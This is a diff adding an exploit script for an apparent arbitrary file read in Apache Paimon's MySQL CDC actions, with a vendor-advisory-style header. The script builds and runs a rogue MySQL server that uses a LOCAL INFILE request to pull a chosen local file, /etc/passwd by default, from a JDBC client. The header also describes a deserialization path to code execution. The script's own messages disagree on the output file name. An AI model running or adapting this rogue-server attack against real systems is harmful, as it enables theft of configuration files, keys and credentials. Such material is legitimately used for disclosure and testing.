@@ -1,0 +1,119 @@
+#!/usr/bin/env bash
+#
+#
+# Apache Paimon 2.1.0 MySQL CDC Arbitrary File Read
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://paimon.apache.org
+# Affected version: 2.1.0, 2.0.0
+#
+# Summary: A lake format that enables building a Realtime Lakehouse Architecture with Flink
+# and Spark for both streaming and batch operations. Innovatively combines lake format and
+# LSM structure, bringing realtime streaming updates into the lake architecture.
+#
+# Desc: Apache Paimon's MySQL CDC synchronization actions (MySqlSyncTableAction /
+# MySqlSyncDatabaseAction) pass user-supplied JDBC connection properties (jdbc.properties.*)
+# into the source MySQL connection URL without sanitization. A user who defines a CDC
+# action can set jdbc.properties.allowLoadLocalInfile=true and point the source at a MySQL
+# server they control. The rogue server answers the connection with a LOCAL INFILE request
+# and the Flink/Paimon CDC process reads arbitrary local files (configuration, keys, credentials)
+# and sends them to the attacker. Setting jdbc.properties.autoDeserialize=true additionally
+# causes a crafted server response to be Java-deserialized, resulting in remote code execution
+# on the Flink TaskManager.
+#
+# Tested on: Microsoft Windows 10
+#            MySQL Connector/J 8.0.33
+#            JDK 11/17
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6026
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6026
+#
+#
+# 13.08.2026
+#
+
+
+set -u
+TARGET_FILE="${TARGET_FILE:-/etc/passwd}"
+PORT="${PORT:-13306}"
+CJ_VER="${CJ_VER:-8.0.33}"
+case "$(uname -s)" in MINGW*|MSYS*|CYGWIN*) SEP=";"; jp(){ cygpath -w "$1"; } ;; *) SEP=":"; jp(){ printf '%s' "$1"; } ;; esac
+command -v python3 >/dev/null || alias python3=python
+INFILE_DIR="$(dirname "$TARGET_FILE")"
+W="$(pwd)/paimon_fr_build"; rm -rf "$W"; mkdir -p "$W"
+
+cat > "$W/rogue_mysql.py" <<'PY'
+import socket
+import struct
+import sys###
+
+PORT=int(sys.argv[1]); TARGET=sys.argv[2]
+def pkt(seq,p): return struct.pack("<I",len(p))[:3]+bytes([seq])+p
+def rp(c):
+    h=c.recv(4)
+    if len(h)<4: return None
+    n=h[0]|(h[1]<<8)|(h[2]<<16); d=b""
+    while len(d)<n:
+        b=c.recv(n-len(d))
+        if not b: break
+        d+=b
+    return d
+def hs():
+    caps=0x00000001|0x00000080|0x00000200|0x00008000|0x00080000
+    p=b"\x0a"+b"5.7.40-rogue\x00"+struct.pack("<I",1)+b"12345678\x00"+struct.pack("<H",caps&0xffff)+b"\x21"
+    p+=struct.pack("<H",0x0002)+struct.pack("<H",(caps>>16)&0xffff)+b"\x15"+b"\x00"*10+b"1234567890AB\x00"+b"mysql_native_password\x00"
+    return p
+OK=b"\x00\x00\x00\x02\x00\x00\x00"
+s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind(("127.0.0.1",PORT)); s.listen(1)
+print("[rogue-mysql] up on 127.0.0.1:%d, target file: %s"%(PORT,TARGET),flush=True)
+c,_=s.accept(); c.sendall(pkt(0,hs())); rp(c); c.sendall(pkt(2,OK))
+while True:
+    d=rp(c)
+    if not d: break
+    if d and d[0]==0x03:
+        c.sendall(pkt(1,b"\xfb"+TARGET.encode()))
+        data=rp(c) or b""
+        open("STOLEN.txt","wb").write(data)
+        print("="*60+"\n[rogue-mysql] FILE READ FROM CLIENT '%s':\n"%TARGET+data.decode("utf-8","replace")+"\n"+"="*60,flush=True)
+        rp(c); c.sendall(pkt(3,OK)); break
+    else:
+        c.sendall(pkt(1,OK))
+c.close(); s.close()
+PY
+
+cat > "$W/PaimonFR.java" <<'EOF'
+import java.sql.*;
+public class PaimonFR {
+  public static void main(String[] a) throws Exception {
+    String url = "jdbc:mysql://127.0.0.1:" + a[0]
+        + "/db?allowLoadLocalInfile=true&allowLoadLocalInfileInPath=" + a[1]
+        + "&useSSL=false&connectTimeout=8000&socketTimeout=8000";
+    System.out.println("[client] Paimon-style URL: " + url);
+    try (Connection c = DriverManager.getConnection(url, "x", "x");
+         Statement s = c.createStatement()) {
+      s.executeQuery("SELECT 1");
+    } catch (Exception e) {
+      System.out.println("[client] " + e.getMessage());
+    }
+  }
+}
+EOF
+
+echo "[*] Fetching MySQL Connector/J $CJ_VER ..."
+curl -fsSL "https://repo1.maven.org/maven2/com/mysql/mysql-connector-j/$CJ_VER/mysql-connector-j-$CJ_VER.jar" \
+  -o "$W/cj.jar" || { echo "[!] Connector/J download failed"; exit 1; }
+echo "[*] Compiling client ..."
+javac -cp "$(jp "$W/cj.jar")" -d "$(jp "$W")" "$(jp "$W/PaimonFR.java")" || { echo "[!] build failed"; exit 1; }
+
+echo "[*] Starting rogue MySQL + firing the JDBC client ..."
+( cd "$W" && python3 rogue_mysql.py "$PORT" "$TARGET_FILE" ) & RP=$!
+sleep 1
+( cd "$W" && java -cp ".${SEP}$(jp "$W/cj.jar")" PaimonFR "$PORT" "$INFILE_DIR" )
+wait $RP 2>/dev/null
+echo "[*] Stolen content saved to $W/ukradeno.txt"
